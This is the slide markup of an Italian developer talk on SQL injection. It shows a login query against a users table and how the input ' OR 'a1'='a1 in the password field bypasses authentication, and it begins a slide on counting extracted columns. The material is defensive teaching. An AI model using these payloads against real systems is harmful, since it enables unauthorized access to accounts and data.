              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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" name="Google Shape;9;p1"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId27">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4440600" y="4663222"/>
            <a:ext cx="262800" cy="322059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8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8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8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8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8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3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8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4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5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6.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sqlserverupdates.com/news/new-security-updates-to-fix-sql-injection-vulnerabilities/" TargetMode="Externa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CodicePlastico/BibeCatalogue" TargetMode="External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8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2679192"/>
            <a:ext cx="8520600" cy="538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" dirty="0"/>
              <a:t>SQL Injection crash(ed) course – Try this ONLY at home!</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it-IT" sz="1600" dirty="0" err="1"/>
              <a:t>ome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it-IT" sz="1600" dirty="0"/>
              <a:t> alcune scelte di comodo in fase di sviluppo possono portare ad effetti... più che indesiderati</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Google Shape;106;p28"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="362905" y="3296700"/>
            <a:ext cx="8520600" cy="50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Alberto Turelli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Barlow Condensed SemiBold"/>
                <a:ea typeface="Barlow Condensed SemiBold"/>
                <a:cs typeface="Barlow Condensed SemiBold"/>
                <a:sym typeface="Barlow Condensed SemiBold"/>
              </a:rPr>
              <a:t>PirlOverflow</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Barlow Condensed SemiBold"/>
              <a:ea typeface="Barlow Condensed SemiBold"/>
              <a:cs typeface="Barlow Condensed SemiBold"/>
              <a:sym typeface="Barlow Condensed SemiBold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Barlow Condensed SemiBold"/>
              <a:ea typeface="Barlow Condensed SemiBold"/>
              <a:cs typeface="Barlow Condensed SemiBold"/>
              <a:sym typeface="Barlow Condensed SemiBold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i="1" dirty="0"/>
              <a:t>Brescia, 21 ottobre 2025</a:t>
            </a:r>
            <a:endParaRPr i="1" dirty="0">
              <a:latin typeface="Barlow Condensed SemiBold"/>
              <a:ea typeface="Barlow Condensed SemiBold"/>
              <a:cs typeface="Barlow Condensed SemiBold"/>
              <a:sym typeface="Barlow Condensed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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EEC36896-F088-20D9-945D-99CB4EFE14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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAC840DB-0542-C018-463E-551827295DA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0150" y="1454970"/>
            <a:ext cx="65637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Una query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>che</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>farò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più</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E56BAEF-7CD9-1247-163D-1BAB62A8159B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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C92B92F-C172-4888-CA57-4ED85DDF0E64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355850" y="2631175"/>
            <a:ext cx="6887100" cy="1546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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	*</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE Email = 'test@example.com'</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	AND Password = 'password123';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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25129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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB92EA55-9502-DAD9-9352-36007BE9ED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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E1604AF-E6B1-22C1-EC71-6D0AADFE442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0150" y="1454970"/>
            <a:ext cx="65637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O </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meglio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>una</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>che</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>implementerò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più</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>così</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD52658B-8CF4-C97A-3A78-FF98F2D479F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6500" y="448013"/>
            <a:ext cx="911000" cy="91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91EFD27-9359-5E97-019F-99A6B00E78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47361" y="2464700"/>
            <a:ext cx="3849278" cy="1712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35988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0"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2472833" y="1497613"/>
            <a:ext cx="4198334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Una buona password…</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120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6500" y="448013"/>
            <a:ext cx="911000" cy="91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30"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1128450" y="2182797"/>
            <a:ext cx="6887100" cy="2243867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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>8+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>caratteri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>Lettere minuscole e maiuscole</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>Numeri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-330200">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Caratteri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>speciali</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Comic Mono" pitchFamily="1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DC34B15A-F317-C316-64C3-D9EE5FAA8B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0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C23C0CFA-5540-B710-5F82-5A75D0F13FF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72833" y="1497613"/>
            <a:ext cx="4198334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Una buona password…</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120;p30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CE21CCC-1155-3405-E6BA-06FA67896ED5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6500" y="448013"/>
            <a:ext cx="911000" cy="91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30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C8A3B44-716F-09C2-B8DB-58F9FB0F0B48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128450" y="2182797"/>
            <a:ext cx="6887100" cy="2243867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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>8+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>caratteri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>Lettere minuscole e maiuscole</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"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93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>Numeri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-330200">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Caratteri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>speciali</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Ci </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>sono</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Userò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>' OR 'a1'='a1</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="00FFFF"/>
              </a:highlight>
              <a:latin typeface="Comic Mono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85296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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35BF998F-C01B-D030-A01B-0E38EFA513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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F49611F-FCAC-62B7-A7D6-A097FEB6AA0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0150" y="1454970"/>
            <a:ext cx="65637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SQL Injection #1: WHERE poisoning</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D591402D-86A8-90E7-DE16-9C39D5043FDC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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E26F98C-8BB1-0BAD-0B79-B77710E12ABB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355850" y="2631175"/>
            <a:ext cx="6887100" cy="1546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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	*</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE Email = 'test@example.com'</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	AND Password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>' OR 'a1'='a1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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54645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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3407A6A-C7DF-4A86-C32F-0A4F44AD87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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53681383-D515-E609-D58C-8C9FA7F716A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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection #1: WHERE poisoning</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A4909F3-C800-0A22-B2EE-FF23B1C50DB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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE9D230D-74E2-C687-60D1-85EC7BC799D4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355850" y="2631175"/>
            <a:ext cx="6887100" cy="1546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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	*</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>Email = 'test@example.com' AND Password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	OR 'a1'='a1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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07276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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BE1A6B1-E094-ED9C-B061-FE8E89F13C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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5505E075-430E-A8EC-14B6-1C5F766907B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0150" y="1454970"/>
            <a:ext cx="65637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Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>numero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>campi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>estratti</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F60C50FD-8700-3126-FC8E-3F86DA52238B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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09DB0031-BA3C-50E3-1199-90EDC42C10F3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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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*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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
